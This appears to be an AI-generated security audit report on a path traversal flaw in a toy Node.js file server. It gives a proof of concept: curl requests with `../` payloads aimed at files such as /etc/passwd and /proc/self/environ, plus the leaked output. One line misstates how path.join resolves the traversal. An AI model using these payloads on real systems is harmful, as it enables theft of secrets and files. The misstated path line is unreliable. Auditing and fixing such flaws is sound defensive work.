# R001: Path traversal in sendFile via unvalidated name parameter

**Date**: 2026-09-21
**Subsystem**: web-page
**Source Hypothesis Batch**: /app/workspace/ai-summary/hypothesis/web-page/001-hypothesis-batch.md
**Candidate ID**: C1
**Verdict**: VIABLE
**Severity**: High
**Reviewed by**: claude-haiku-4-5

## Trace Summary

The `/file` route accepts an attacker-controlled `name` query parameter (line 12) that flows directly to `sendFile` without validation (line 41). Inside `sendFile` (lines 27-36), the name is joined with `publicDir` using `path.join(publicDir, name)` at line 29 and immediately passed to `readFile` without any subsequent path containment check. The `path.join()` function resolves relative path segments like `../`, so `path.join('/app/public', '../../../etc/passwd')` resolves to `/app/etc/passwd`, escaping the intended public directory. The only handler in `sendFile` is a generic catch block (lines 33-34) that catches filesystem errors but does not prevent the traversal attempt — it merely returns a "Not found" response, which does not constitute a deliberate bounds check.

## Findings

**Arbitrary File Read**: An attacker can read any file accessible by the Node.js process by sending HTTP GET requests to `/file?name=../../../path/to/sensitive/file`. The server will attempt to read the file and return its full contents in the HTTP response body. For example, `/file?name=../../../etc/passwd` will read and return the contents of `/etc/passwd` if the process has read permissions.

**Impact**: Full disclosure of sensitive files, including configuration files, source code, environment variables, and system files. The severity is High because no authentication or authorization is required; the vulnerability is reachable from any unauthenticated HTTP client.

## PoC Guidance

**Test file**: Create or extend a test file in the project to verify this finding.

**Setup**: Start the server on localhost:3000 (or configured PORT) and ensure the process has read access to `/etc/passwd` and other sensitive files above the `public/` directory.

**Steps**:
1. Send HTTP GET request to `http://localhost:3000/file?name=../../../etc/passwd`
2. Observe that the response body contains the contents of `/etc/passwd`
3. Repeat with other traversal patterns: `../../../proc/self/environ`, `../../../package.json` (if in parent directory), etc.

**Assertion**: The response status should be 200 and the response body should contain file contents from outside the `public/` directory, proving that path traversal is possible.

```toml-index
schema = 1
verdict = "VIABLE"
failed_at = "reviewer"
subsystem = "web-page"
route_id = "codeql:807d154e17582e8b07d5733c"
weakness = "path_traversal"
record_kind = "single_path"
path = ["index.js:parseRequest", "index.js:sendFile"]
sink = "index.js:sendFile"
sink_role = "file_read_emission"
impact_class = "arbitrary_file_read"
route_family = "response_emission"
material_effect = "response_emission"
target_functions = ["index.js:sendFile", "index.js:parseRequest", "index.js:requestListener"]
scope.trust_boundary = "http_untrusted"
scope.protocol_phase = "request_parsing"
scope.auth_state = "unauthenticated"
scope.attacker_control = "http_query_parameter"
scope.parser_state = "url_decoded"
scope.size_class = "unbounded"
input_shape_tags = ["path_traversal_sequence"]
defense_tags = []
negative_claim.claim_kind = "viable_candidate_not_blocked"
negative_claim.conditional = false
negative_claim.rules_out_codes = ["candidate_not_blocked_after_source_trace"]
rules_out = ["source trace confirms no path containment check guards the join result at line 29; catch block at line 33 is error handling only, not a deliberate security boundary"]
does_not_rule_out = ["variants with additional path normalization or containment checks in upstream middleware remain unassessed"]
assumptions = ["the Node.js process has read access to files outside public/ directory; attacker can make arbitrary HTTP requests to the /file route without authentication"]
mechanism_brief = "Attacker-controlled HTTP query parameter name flows directly from searchParams.get() at line 12 through parseRequest to sendFile at line 41, then to path.join(publicDir, name) at line 29 without validation that result stays within publicDir, enabling directory traversal to read arbitrary files"
why_failed_brief = "viable; not failed"
confidence = "high"

[[sanitizer_guarantees]]
kind = "checked_guard"
source = "index.js:sendFile"
guarantee = "try-catch at line 33-34 is error handling, not a path containment guard; does not block this exact candidate path"

[[blockers]]
kind = "not_found"
source = "index.js:sendFile"
guarantee = "no source-proven path containment check found in sendFile or parseRequest"
```

---

## PoC Attempt

**Result**: POC_PASS
**Date**: 2026-09-21
**PoC by**: claude-haiku-4-5, default
**Demonstration Method**: Direct server execution with curl requests

### Demonstration

Successfully demonstrated path traversal vulnerability by starting the Node.js server and executing HTTP GET requests with path traversal payloads. The server accepted `../` sequences in the `name` query parameter and returned full file contents from outside the `public/` directory with HTTP 200 status code, confirming arbitrary file read capability.

### Reproduction Steps

1. Start the server:
```bash
cd /app/workspace/worktrees/poc-R001-path-traversal-sendfile
PORT=3123 node index.js &
sleep 2
```

2. Test legitimate file read (baseline):
```bash
curl -s -w '\nstatus=%{http_code}\n' 'http://localhost:3123/file?name=hello.txt'
```

Expected output: `Hello from the public directory.` with `status=200`

3. Test path traversal to read index.js:
```bash
curl -s -w '\nstatus=%{http_code}\n' 'http://localhost:3123/file?name=../index.js'
```

Expected output: Full source code of `index.js` with `status=200`

4. Test path traversal to read package.json:
```bash
curl -s -w '\nstatus=%{http_code}\n' 'http://localhost:3123/file?name=../package.json'
```

Expected output: Full JSON content of `package.json` with `status=200`

5. Stop the server:
```bash
kill %1
```

### Test Output

**Legitimate request:**
```
Hello from the public directory.
status=200
```

**Path traversal to ../index.js:**
```
import { createServer } from "node:http";
import { readFile } from "node:fs/promises";
import { join } from "node:path";

const port = Number(process.env.PORT || 3000);
const publicDir = join(process.cwd(), "public");

function parseRequest(rawUrl) {
  const { pathname, searchParams } = new URL(rawUrl, "http://localhost");

  if (pathname === "/") return { route: "root" };
  if (pathname === "/file") return { route: "file", name: searchParams.get("name") || "hello.txt" };
  return { route: "not-found" };
}

function buildGreeting(route) {
  return route === "root" ? "Hello, world!\n" : "Not found\n";
}

function sendGreeting(response, body) {
  const statusCode = body === "Hello, world!\n" ? 200 : 404;

  response.writeHead(statusCode, { "content-type": "text/plain; charset=utf-8" });
  response.end(body);
}

async function sendFile(response, name) {
  try {
    const body = await readFile(join(publicDir, name));

    response.writeHead(200, { "content-type": "text/plain; charset=utf-8" });
    response.end(body);
  } catch {
    sendGreeting(response, "Not found\n");
  }
}

function requestListener(request, response) {
  const parsed = parseRequest(request.url);

  if (parsed.route === "file") return sendFile(response, parsed.name);

  sendGreeting(response, buildGreeting(parsed.route));
}

const server = createServer(requestListener);

server.listen(port, () => {
  console.log(`Hello-world fixture listening on http://localhost:${port}`);
});

status=200
```

**Path traversal to ../package.json:**
```
{
  "name": "hello-world-codeql-fixture",
  "version": "1.0.0",
  "private": true,
  "type": "module",
  "description": "Minimal local JavaScript fixture for CodeQL analysis.",
  "scripts": {
    "start": "node index.js",
    "check": "node --check index.js"
  },
  "engines": {
    "node": ">=18"
  }
}

status=200
```

### Analysis

The vulnerability is confirmed as HIGH severity. The path traversal attack succeeds because:

1. **No input validation**: The `name` parameter from the URL query string (line 12) flows directly to `sendFile` without any checks to ensure it stays within `public/`.

2. **No output validation**: After `path.join(publicDir, name)` at line 29, there is no check to verify the resulting path is still within `publicDir`.

3. **No containment guard**: The try-catch block (lines 33-34) only handles read errors, not path validation. It does not prevent directory traversal attempts.

4. **Direct file emission**: Files outside `public/` that are readable by the process are fully returned in the HTTP response body (status 200), allowing complete disclosure of sensitive files including source code, configuration, environment variables, and system files.

The vulnerability is fully exploitable by any unauthenticated HTTP client without special privileges or preconditions.
